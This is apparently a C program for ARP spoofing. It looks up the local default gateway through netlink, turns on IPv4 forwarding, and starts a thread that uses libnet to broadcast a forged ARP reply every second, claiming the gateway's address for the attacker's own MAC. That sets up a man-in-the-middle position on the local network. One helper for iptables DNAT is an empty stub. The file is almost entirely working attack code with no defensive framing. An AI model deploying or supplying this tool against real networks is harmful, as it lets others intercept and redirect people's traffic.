#include <arpa/inet.h>
#include <cstdint>
#include <libnet.h>
#include <linux/rtnetlink.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <pthread.h>

struct reqhdr {
  struct nlmsghdr nl;
  struct rtmsg rt;
};

int if_index(char *if_name) {
  int sfd = socket(PF_INET, SOCK_DGRAM, 0);
  if (sfd < 0) {
    perror("socket");
    return -1;
  }
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(struct ifreq));
  strncpy(ifr.ifr_name, if_name, IFNAMSIZ - 1);
  if (ioctl(sfd, SIOCGIFINDEX, &ifr) < 0) {
    perror("ioctl");
    close(sfd);
    return -1;
  }
  close(sfd);
  return ifr.ifr_ifindex;
}

int iptables_dnat(char *interface) {
}

char *gateway_ip_addr(int if_index) {
  int sfd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (sfd < 0) {
    perror("socket");
    return NULL;
  }
  struct sockaddr_nl snl;
  memset(&snl, 0, sizeof(struct sockaddr_nl));
  snl.nl_family = AF_NETLINK;
  snl.nl_pid = 0;
  struct reqhdr req;
  memset(&req, 0, sizeof(struct reqhdr));
  req.nl.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
  req.nl.nlmsg_type = RTM_GETROUTE;
  req.nl.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
  req.nl.nlmsg_seq = 0;
  req.nl.nlmsg_pid = getpid();
  req.rt.rtm_family = AF_INET;
  req.rt.rtm_table = RT_TABLE_MAIN;
  int err = sendto(sfd, (void *)&req, sizeof(struct reqhdr), 0,
                   (struct sockaddr *)&snl, sizeof(struct sockaddr_nl));
  if (err < 0) {
    perror("sendto");
    close(sfd);
    return NULL;
  }
  char buf[8192];
  memset(&buf, 0, sizeof(buf));
  char *ptr = buf;
  int len = 0;
  struct nlmsghdr *nlp;
  do {
    int rclen = recv(sfd, ptr, sizeof(buf) - len, 0);
    if (rclen < 0) {
      perror("recv");
      close(sfd);
      return NULL;
    }
    nlp = (struct nlmsghdr *)ptr;
    ptr += rclen;
    len += rclen;
  } while (len < sizeof(buf) && nlp->nlmsg_flags & NLM_F_MULTI &&
           nlp->nlmsg_type != NLMSG_DONE);

  nlp = (struct nlmsghdr *)buf;
  for (; NLMSG_OK(nlp, len); nlp = NLMSG_NEXT(nlp, len)) {
    struct rtmsg *rtp = (struct rtmsg *)NLMSG_DATA(nlp);
    if (rtp->rtm_table != RT_TABLE_MAIN)
      continue;
    struct rtattr *atp = (struct rtattr *)RTM_RTA(rtp);
    int atlen = RTM_PAYLOAD(nlp);
    char dst[32], msk[32], gwy[32], dev[32];
    for (; RTA_OK(atp, atlen); atp = RTA_NEXT(atp, atlen)) {
      if (atp->rta_type == RTA_DST) {
        inet_ntop(AF_INET, RTA_DATA(atp), dst, sizeof(dst));
      } else if (atp->rta_type == RTA_OIF) {
        snprintf(dev, sizeof(dev), "%u", *(unsigned int *)RTA_DATA(atp));
      } else if (atp->rta_type == RTA_GATEWAY) {
        inet_ntop(AF_INET, RTA_DATA(atp), gwy, sizeof(gwy));
      }
    }
    if (strlen(dst) == 0 && atoi(dev) == if_index) {
      close(sfd);
      return strdup(gwy);
    }
  }
  return NULL;
}

int ip_forwarding(){
  FILE *fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
  if (fp == NULL) {
    perror("fopen");
    return -1;
  }
  if (fprintf(fp, "1") < 0) {
    perror("fprintf");
    fclose(fp);
    return -1;
  }
  if (fclose(fp) != 0) {
    perror("fclose");
    return -1;
  }
  return 0;
}

struct arp_spoofing_args {
  char *interface;
  char *gateway_ip;
};

void* arp_spoofing(void *args) {
  struct arp_spoofing_args *spoof_args = (struct arp_spoofing_args *)args;
  char *interface = spoof_args->interface;
  char *gateway_ip = spoof_args->gateway_ip;
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_t *ln = libnet_init(LIBNET_LINK, interface, errbuf);
  struct libnet_ether_addr *src_hw_addr;
  src_hw_addr = libnet_get_hwaddr(ln);
  if (src_hw_addr == NULL) {
    fprintf(stderr, "Error getting hardware address: %s\n", errbuf);
    return NULL;
  }
  u_int32_t target_ip_addr = libnet_name2addr4(ln, gateway_ip, LIBNET_DONT_RESOLVE);
  if (target_ip_addr == -1) {
    fprintf(stderr, "Error resolving IP address: %s\n", errbuf);
    return NULL;
  }
  u_int32_t zero_ip_addr =
      libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  if (zero_ip_addr == -1) {
    fprintf(stderr, "Error resolving IP address: %s\n", errbuf);
    return NULL;
  }
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  int err = libnet_autobuild_arp(ARPOP_REPLY, src_hw_addr->ether_addr_octet,
                       (u_int8_t *)&target_ip_addr, zero_hw_addr,
                       (u_int8_t *)&zero_ip_addr, ln);
  if (err == -1) {
    fprintf(stderr, "Error building ARP packet: %s\n", libnet_geterror(ln));
    return NULL;
  }
  err = libnet_autobuild_ethernet(bcast_hw_addr, ETHERTYPE_ARP, ln);
  if (err == -1) {
    fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(ln));
    return NULL;
  }
  while (1) {
    err = libnet_write(ln);
    if (err == -1) {
      fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(ln));
      return NULL;
    }
    sleep(1);
  }
  libnet_destroy(ln);
  return 0;
}

uint32_t ip_addr(char *interface) {
  int sfd = socket(PF_INET, SOCK_DGRAM, 0);
  if (sfd < 0) {
    perror("socket");
    return -1;
  }
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(struct ifreq));
  strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
  if (ioctl(sfd, SIOCGIFADDR, &ifr) < 0) {
    perror("ioctl");
    close(sfd);
    return -1;
  }
  close(sfd);
  return ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
}

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
    return EXIT_FAILURE;
  }
  char *interface = argv[1];
  int index = if_index(interface);
  if (index < 0) {
    fprintf(stderr, "Error getting interface index\n");
    return EXIT_FAILURE;
  }
  char *gateway = gateway_ip_addr(index);
  if (gateway == NULL) {
    fprintf(stderr, "Error getting gateway IP address\n");
    return EXIT_FAILURE;
  }
  printf("Gateway IP address: %s\n", gateway);
  if (ip_forwarding() < 0) {
    fprintf(stderr, "Error enabling IP forwarding\n");
    free(gateway);
    return EXIT_FAILURE;
  }
  printf("IP forwarding enabled\n");
  pthread_t arp_thread;
  struct arp_spoofing_args args;
  args.interface = interface;
  args.gateway_ip = gateway;
  if (pthread_create(&arp_thread, NULL, arp_spoofing, (void *)&args) != 0) {
    fprintf(stderr, "Error creating ARP spoofing thread\n");
    free(gateway);
    return EXIT_FAILURE;
  }
  pthread_join(arp_thread, NULL);
  return 0;
}
